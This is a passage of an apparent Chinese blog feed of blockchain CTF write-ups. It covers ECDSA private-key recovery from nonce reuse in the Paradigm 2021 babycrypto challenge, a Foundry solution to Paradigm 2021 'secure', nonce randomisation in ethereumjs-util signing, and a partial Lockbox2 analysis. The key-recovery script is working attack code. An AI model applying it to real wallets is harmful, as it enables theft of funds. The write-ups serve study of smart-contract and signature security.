class="keyword">from</span> ecdsa <span class="keyword">import</span> ecdsa, SigningKey</span><br><span class="line"><span class="keyword">from</span> ecdsa.numbertheory <span class="keyword">import</span> inverse_mod</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="comment"># g: chal.py使用的特定加密曲线算法。</span></span><br><span class="line"><span class="comment"># r: 相同的r值</span></span><br><span class="line"><span class="comment"># sA,sB: 输入message, 然后chal.py输出的s</span></span><br><span class="line"><span class="comment"># hashA,hashB: 输入的message的hash值</span></span><br><span class="line"></span><br><span class="line">g = ecdsa.generator_secp256k1</span><br><span class="line">publicKeyOrderInteger = g.order()</span><br><span class="line"></span><br><span class="line">r = <span class="string">&quot;e430b3a398f2320556eef81c1c523ea5ae0a920f493c8376eafcb0dc9cd75b89&quot;</span> <span class="comment"># 相同的r值</span></span><br><span class="line"></span><br><span class="line">sA = <span class="string">&quot;bbfb7b34c31f025bddb8724a53dae7dd5a17c489587b881b8ed0dc5453c07e87&quot;</span> <span class="comment"># 消息`&lt;/3`的s</span></span><br><span class="line">sB = <span class="string">&quot;43d8ec82d7b6b1f3c8ed41b0ba682d5291f6d4a922a57729fa716dccd0f237d6&quot;</span> <span class="comment"># 消息`no`的s</span></span><br><span class="line"></span><br><span class="line">hashA = <span class="string">&quot;45951261090588542051596130132754692813999860320220484796045003839994507210350&quot;</span> <span class="comment"># `&lt;/3`的hash值</span></span><br><span class="line">hashB = <span class="string">&quot;56710668495515998944273818574660611208941006033402527734960197520384934694586&quot;</span> <span class="comment"># `no`的哈希值</span></span><br><span class="line"></span><br><span class="line">r1 = <span class="built_in">int</span>(r, <span class="number">16</span>)</span><br><span class="line">s1 = <span class="built_in">int</span>(sA, <span class="number">16</span>)</span><br><span class="line">s2 = <span class="built_in">int</span>(sB, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">L1 = <span class="built_in">int</span>(hashA, <span class="number">10</span>)</span><br><span class="line">L2 = <span class="built_in">int</span>(hashB, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">numerator = (((s2 * L1) % publicKeyOrderInteger) - ((s1 * L2) % publicKeyOrderInteger))</span><br><span class="line">denominator = inverse_mod(r1 * ((s1 - s2) % publicKeyOrderInteger), publicKeyOrderInteger)</span><br><span class="line"></span><br><span class="line">privateKey = numerator * denominator % publicKeyOrderInteger</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(privateKey)</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="思路1-1"><a href="#思路1-1" class="headerlink" title="思路1"></a>思路1</h3><ol><li>随便输入4个message</li><li>打印出<code>test=</code>的内容，将此内容作为参数输入我们的脚本，得到r和s</li><li>再将r和s输入回题目的python脚本，完成</li></ol><p>下面是得到r和s的脚本例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS E:\BlockChainCTF\Paradigm 2021&gt; &amp; d:/environment/python305/python305.exe <span class="string">&quot;e:/BlockChainCTF/Paradigm 2021/src/03.babycrypto/test.py&quot;</span></span><br><span class="line">msg1? <span class="built_in">test</span></span><br><span class="line">msg2? test1</span><br><span class="line">r1? 67301546230259439644359053584721379568919080569085179252685698636483892629289</span><br><span class="line">s1? 73622799527434127903940560943498995649761922715977926009361268130333681085387</span><br><span class="line">s2? 20463651075801853238185465293923791885297838446287006594323104600372328967360</span><br><span class="line"><span class="built_in">test</span>?   `输入题目脚本给出的<span class="built_in">test</span>内容`</span><br><span class="line">solved r=xxxxx</span><br><span class="line">solved s=xxxxx</span><br></pre></td></tr></table></figure><h3 id="思路2-1"><a href="#思路2-1" class="headerlink" title="思路2"></a>思路2</h3><ol><li>跑脚本得到私钥</li><li>用私钥对chal.py提供的hash进行签名</li><li>将签名分解出r和s</li><li>完成题目</li></ol>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.secure</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/02.secure/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/02.secure/</url>
      
        <content type="html"><![CDATA[<h1 id="secure"><a href="#secure" class="headerlink" title="secure"></a>secure</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li><p>Wallet.sol</p><ul><li>ERC20Like：接口</li><li>TokenModule：合约，仅拥有<code>deposit()</code>和<code>withdraw()</code>两个方法</li><li>Wallet：一个钱包合约，所有操作都需要owner本人，获取owner批准的白名单用户才可以操作，但是无法修改owner，拥有<code>delegatecall()</code></li></ul></li><li><p>Setup.sol</p><ul><li>WETH9：接口</li><li>Setup：在构造器初始化题目</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将本合约的余额0修改为50</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">    return WETH.balanceOf(address(this)) == WANT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>所有内容都在Setup的构造器中初始化：本来Setup合约有50WETH，然后转出去了，变为0WETH，完成题目的要求是让Setup合约再次拥有50WETH。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  constructor() public payable &#123;</span><br><span class="line">  // 合约创建的时候传入了50 ether</span><br><span class="line">      require(msg.value == WANT);</span><br><span class="line"></span><br><span class="line">// 新建一个 TokenModule 合约</span><br><span class="line">      address tokenModule = address(new TokenModule());</span><br><span class="line"></span><br><span class="line">// 新建一个 Wallet 合约，本合约是 Wallet 合约的owner</span><br><span class="line">      wallet = new Wallet 合约();</span><br><span class="line">      // wallet 将 tokenModule 合约添加进白名单</span><br><span class="line">      wallet.allowModule(tokenModule);</span><br><span class="line"></span><br><span class="line">      // 本合约在 WETH 合约拥有50ETH</span><br><span class="line">      WETH.deposit.value(msg.value)();</span><br><span class="line">      // wallet 可以操作本合约在 WETH 的50ETH</span><br><span class="line">      WETH.approve(address(wallet), uint(-1));</span><br><span class="line"></span><br><span class="line">      // wallet 在 WETH 合约拥有50ETH</span><br><span class="line">      wallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>经过分析，wallet合约我的账户无法做任何操作，因为不是白名单中。<code>wallet 将 tokenModule 合约添加进白名单</code> 是关键，因为这个合约进入了白名单。</p><p>TokenModule合约的两个函数，如果token是WETH，我们也无法做任何操作：</p><ul><li><p><code>transferFrom()</code>：没有任何人<code>approve()</code>给TokenModule合约</p></li><li><p><code>transfer()</code>：TokenModule合约都没有钱，更加无法操作</p></li></ul><p>我想的方式是通过TokenModule合约调用wallet合约的<code>execModule()</code>从而转钱，因为wallet合约有钱嘛。但是行不通，因为TokenModule合约根本没有办法调用<code>execModule()</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract TokenModule &#123;</span><br><span class="line">    function deposit(ERC20Like token, address from, uint amount) public &#123;</span><br><span class="line">        token.transferFrom(from, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(ERC20Like token, address to, uint amount) public &#123;</span><br><span class="line">        token.transfer(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我本来认为考点就是我上面分析的那样，把一开始的50ether转回去，让Setup合约重新拥有50ether完成题目。其实在Paradigm里面，每个用户每个关卡都拥有5000ether，我们只要充值50ether给WETH，然后转给Setup即可完成题目，实在无语。。。。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    string constant Setup_Artifact = &#x27;out/Setup.sol/Setup.json&#x27;;</span><br><span class="line">    string constant weth9_Artifact = &#x27;out/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    ISetup level;</span><br><span class="line">    IWETH9 weth9;</span><br><span class="line">    </span><br><span class="line">    function setUp() public payable&#123;</span><br><span class="line">        // 创建我们的WETH9合约</span><br><span class="line">        weth9 = IWETH9(deployHelper_weth(weth9_Artifact));</span><br><span class="line">        // 初始化题目合约，并传入WETH9合约的地址，因为复现的原因，WETH9的地址修改了一下，题目源码修改了一点，但是效果是差不多一样的</span><br><span class="line">        level = ISetup(this.deployHelper_Setup&#123;value:50 ether&#125;(Setup_Artifact,address(weth9)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        // 因为在Paradigm 2021中，每个用户初始化拥有5000个ETH</span><br><span class="line">        weth9.deposit&#123;value: 50 ether&#125;();</span><br><span class="line">        weth9.transfer(address(level), 50 ether);</span><br><span class="line"></span><br><span class="line">        // 检查是否完成</span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function deployHelper_Setup(string memory what,address _addr) public payable returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(address(_addr)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(50000000000000000000, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.sign a message</title>
      <link href="/2023/09/18/17.signature/02.sign%20a%20message/"/>
      <url>/2023/09/18/17.signature/02.sign%20a%20message/</url>
      
        <content type="html"><![CDATA[<h1 id="sign-a-message"><a href="#sign-a-message" class="headerlink" title="sign a message"></a>sign a message</h1><p>通常情况下，我们使用相同的私钥，对相同的消息签名，得到的签名是一样的，无论我们使用的是web3py, web3js还是ethersjs的工具库。</p><p>比如下面的python代码，就是生成了固定的签名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">messagehash = Web3.keccak(text=<span class="string">&quot;Hello, world!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message&#x27;s hash&quot;</span>,messagehash.<span class="built_in">hex</span>())</span><br><span class="line">privatekey =<span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span></span><br><span class="line">signMessage = Account.signHash(message_hash=messagehash, private_key=privatekey)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &quot;</span>, Web3.to_hex(signMessage.r))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s = &quot;</span>, Web3.to_hex(signMessage.s))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v = &quot;</span>, Web3.to_hex(signMessage.v))</span><br><span class="line"></span><br><span class="line"><span class="comment"># the result</span></span><br><span class="line"><span class="comment"># message&#x27;s hash 0xb6e16d27ac5ab427a7f68900ac5559ce272dc6c37c82b3e052246c82244c50e4</span></span><br><span class="line"><span class="comment"># r =  0xf34a885406bbff23b48777067309abfef26339490350c138ddd1b033901afff6</span></span><br><span class="line"><span class="comment"># s =  0x18d6b1fbf0d70207621e91beb0599ae01fc8e251d9bcb94f6203ce681fab71b6</span></span><br><span class="line"><span class="comment"># v =  0x1c</span></span><br></pre></td></tr></table></figure><p>ethersjs的工具库也是类似的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethereumjsUtil = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-util&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要签名的消息</span></span><br><span class="line"><span class="keyword">const</span> message = <span class="string">&#x27;Hello, world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私钥（注意：这只是一个示例私钥，不应该在实际项目中使用）</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成消息的 Keccak-256 哈希</span></span><br><span class="line"><span class="keyword">const</span> messageHash = ethereumjsUtil.<span class="title function_">keccak256</span>(message);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用私钥对消息哈希进行签名</span></span><br><span class="line"><span class="keyword">const</span> signature = ethereumjsUtil.<span class="title function_">ecsign</span>(messageHash, privateKey);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将签名结果进行格式化</span></span><br><span class="line"><span class="keyword">const</span> formattedSignature = &#123;</span><br><span class="line">  <span class="attr">v</span>: signature.<span class="property">v</span>,</span><br><span class="line">  <span class="attr">r</span>: signature.<span class="property">r</span>.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">  <span class="attr">s</span>: signature.<span class="property">s</span>.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Message:&#x27;</span>, message);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Message Hash:&#x27;</span>, messageHash.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Signature:&#x27;</span>, formattedSignature);</span><br><span class="line"></span><br><span class="line"><span class="comment">// the result</span></span><br><span class="line"><span class="comment">// Message: Hello, world!</span></span><br><span class="line"><span class="comment">// Message Hash: b6e16d27ac5ab427a7f68900ac5559ce272dc6c37c82b3e052246c82244c50e4</span></span><br><span class="line"><span class="comment">// Signature: &#123;</span></span><br><span class="line"><span class="comment">//   v: 28,</span></span><br><span class="line"><span class="comment">//   r: &#x27;f34a885406bbff23b48777067309abfef26339490350c138ddd1b033901afff6&#x27;,</span></span><br><span class="line"><span class="comment">//   s: &#x27;18d6b1fbf0d70207621e91beb0599ae01fc8e251d9bcb94f6203ce681fab71b6&#x27;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><p>这样看来，所有封装好的工具库都是得到相同的结果，这也印证了平时我们的认知：相同的私钥对相同的消息，只能生成相同的签名。其实不然，这些封装好的工具库其实是对其中一个参数固定了不取值：临时密钥。如果这个值修改，得到的签名就会不同。</p><p>比如在上面代码的js版本中，是通过ethereumjs-util这个库进行签名的，我们来追溯源码，最终找到：node_modules\ethereumjs-util\dist\signature.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">ecsign</span> = <span class="keyword">function</span> (<span class="params">msgHash, privateKey, chainId</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sig = secp256k1.<span class="title function_">sign</span>(msgHash, privateKey&#125;);</span><br><span class="line">    <span class="keyword">var</span> recovery = sig.<span class="property">recovery</span>;</span><br><span class="line">    <span class="keyword">var</span> ret = &#123;</span><br><span class="line">        <span class="attr">r</span>: sig.<span class="property">signature</span>.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">32</span>),</span><br><span class="line">        <span class="attr">s</span>: sig.<span class="property">signature</span>.<span class="title function_">slice</span>(<span class="number">32</span>, <span class="number">64</span>),</span><br><span class="line">        <span class="attr">v</span>: chainId ? recovery + (chainId * <span class="number">2</span> + <span class="number">35</span>) : recovery + <span class="number">27</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有node_modules\ethereumjs-util\dist\secp256k1v3-adapter.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">sign</span> = <span class="keyword">function</span> (<span class="params">message, privateKey, options</span>) &#123;</span><br><span class="line">......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，secp256k1算法是还有一个参数options的，在ecsign实现的时候，这个值并没有传，使用了默认值（各大封装好的工具库都是一样使用这个默认值，好像是啥都没填写，没找到具体值，似乎是undifined）。那么如果我们将options给一个随机值，得到的签名就会不同，因此我们修改源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; randomBytes &#125; = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">ecsign</span> = <span class="keyword">function</span> (<span class="params">msgHash, privateKey, chainId</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sig = secp256k1.<span class="title function_">sign</span>(msgHash, privateKey,&#123;<span class="attr">data</span>: <span class="title function_">randomBytes</span>(<span class="number">32</span>)&#125;);</span><br><span class="line">    <span class="keyword">var</span> recovery = sig.<span class="property">recovery</span>;</span><br><span class="line">    <span class="keyword">var</span> ret = &#123;</span><br><span class="line">        <span class="attr">r</span>: sig.<span class="property">signature</span>.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">32</span>),</span><br><span class="line">        <span class="attr">s</span>: sig.<span class="property">signature</span>.<span class="title function_">slice</span>(<span class="number">32</span>, <span class="number">64</span>),</span><br><span class="line">        <span class="attr">v</span>: chainId ? recovery + (chainId * <span class="number">2</span> + <span class="number">35</span>) : recovery + <span class="number">27</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样，我们每次签名，得到的结果都不一样了，成功做到：相同私钥，相同消息，不同签名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[Running] node <span class="string">&quot;d:\ethersjs\practice\capturetheether.js&quot;</span></span><br><span class="line">Message: Hello, world!</span><br><span class="line">Message Hash: b6e16d27ac5ab427a7f68900ac5559ce272dc6c37c82b3e052246c82244c50e4</span><br><span class="line">Signature: &#123;</span><br><span class="line">  v: 27,</span><br><span class="line">  r: <span class="string">&#x27;4706db97b1d93ceb09919e76cd964574c6742b78dd0052899b2e0988710abbd8&#x27;</span>,</span><br><span class="line">  s: <span class="string">&#x27;48a4bcf9d488aa5531f27adeef52388021461139eea8db19cc5bf73d8162ce21&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Done] exited with code=0 <span class="keyword">in</span> 0.386 seconds</span><br><span class="line"></span><br><span class="line">[Running] node <span class="string">&quot;d:\ethersjs\practice\capturetheether.js&quot;</span></span><br><span class="line">Message: Hello, world!</span><br><span class="line">Message Hash: b6e16d27ac5ab427a7f68900ac5559ce272dc6c37c82b3e052246c82244c50e4</span><br><span class="line">Signature: &#123;</span><br><span class="line">  v: 28,</span><br><span class="line">  r: <span class="string">&#x27;c192b6a1e32ff0c3400632f5bf5e196a2c9d7abf05884ea9b4de3cfabfd2d04a&#x27;</span>,</span><br><span class="line">  s: <span class="string">&#x27;446c55c8a713162564aeb3216fe1003ad901ff6ed7aef89d6f841c722bf73326&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道，在solidity预编译的ecRecover合约的ecdsa算法中，使用的是secp256k1算法，临时密钥options，会影响到它验证吗？回答：不会影响。因为顾名思义，临时密钥options，只是一个临时性的东西，他取任何值都可以，不会影响结果的有效性。这就意味着，用相同的私钥，签名相同的消息，得到不同的签名结果，这些签名都是有效的，可以通过ecrecover的验证。</p>]]></content>
      
      
      <categories>
          
          <category> 17.signature </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.Lockbox2</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/07.Lockbox2/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/07.Lockbox2/</url>
      
        <content type="html"><![CDATA[<h1 id="Lockbox2"><a href="#Lockbox2" class="headerlink" title="Lockbox2"></a>Lockbox2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-任务"><a href="#1-任务" class="headerlink" title="1.任务"></a>1.任务</h3><p>任务是让<code>lockbox2.locked()</code>值设置为false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">       return !lockbox2.locked();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后我们看Lockbox2.sol合约可以知道，需要成功调用<code>solve()</code>，其实也就是通过5个stage的检验，调用方式为：外部进行call调用，输入：<code>solve()函数选择器 + msg.data</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function solve() external &#123;</span><br><span class="line">    bool[] memory successes = new bool[](5);</span><br><span class="line">    (successes[0],) = address(this).delegatecall(abi.encodePacked(this.stage1.selector, msg.data[4:]));</span><br><span class="line">    (successes[1],) = address(this).delegatecall(abi.encodePacked(this.stage2.selector, msg.data[4:]));</span><br><span class="line">    (successes[2],) = address(this).delegatecall(abi.encodePacked(this.stage3.selector, msg.data[4:]));</span><br><span class="line">    (successes[3],) = address(this).delegatecall(abi.encodePacked(this.stage4.selector, msg.data[4:]));</span><br><span class="line">    (successes[4],) = address(this).delegatecall(abi.encodePacked(this.stage5.selector, msg.data[4:]));</span><br><span class="line">    for (uint256 i = 0; i &lt; 5; ++i) require(successes[i]);</span><br><span class="line">    locked = false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-通过5个stage"><a href="#2-通过5个stage" class="headerlink" title="2.通过5个stage"></a>2.通过5个stage</h3><h4 id="2-1stage1"><a href="#2-1stage1" class="headerlink" title="2.1stage1"></a>2.1stage1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function stage1() external &#123;</span><br><span class="line">    require(msg.data.length &lt; 500);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个条件很容易满足，只需要我们的msg.data不要太长即可</p><h4 id="2-2stage2"><a href="#2-2stage2" class="headerlink" title="2.2stage2"></a>2.2stage2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function stage2(uint256[4] calldata arr) external &#123;</span><br><span class="line">    for (uint256 i = 0; i &lt; arr.length; ++i) &#123;</span><br><span class="line">        require(arr[i] &gt;= 1); </span><br><span class="line">        for (uint256 j = 2; j &lt; arr[i]; ++j) &#123; </span><br><span class="line">            require(arr[i] % j != 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，第二个条件是将我们的msg.data分成了uint256[4]，也就是说每32个字节一份。然后要求：</p><ul><li>数组的每个数值必须是大于或等于1的素数</li><li>由于<code>for (uint256 j = 2; j &lt; arr[i]; ++j)</code>，因此我们的素数不能很大，不然会造成gas不足或者达到区块的gaslimit限制，我们无法知道某个素数花了多少gas，因此选择的素数越小越好</li></ul><h4 id="2-3stage3"><a href="#2-3stage3" class="headerlink" title="2.3stage3"></a>2.3stage3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function stage3(uint256 a, uint256 b, uint256 c) external &#123;</span><br><span class="line">    assembly &#123; mstore(a, b) &#125;</span><br><span class="line">    (bool success, bytes memory data) = address(uint160(a + b)).staticcall(&quot;&quot;);</span><br><span class="line">    require(success &amp;&amp; data.length == c);</span><br><span 